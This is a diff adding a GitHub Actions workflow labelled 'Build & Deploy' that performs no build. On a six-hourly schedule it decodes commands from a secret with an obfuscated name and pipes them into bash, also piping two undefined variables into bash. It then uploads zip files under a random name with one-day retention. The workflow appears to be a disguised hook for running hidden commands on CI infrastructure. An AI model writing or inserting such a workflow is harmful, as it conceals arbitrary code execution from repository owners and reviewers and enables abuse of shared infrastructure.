@@ -1,0 +1,30 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          ir95567: ${{ secrets.ir95567 }}
+        run: |
+          printf '%s' "$ir95567" | jq -r .wfxf01 | /bin/bash
+          echo $bwlh227 | jq -r .bl05467 | /bin/bash
+          echo $za54 | jq -r .dvduy72 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: s1R24hJ1
+          path: "*.zip"
+          retention-days: 1
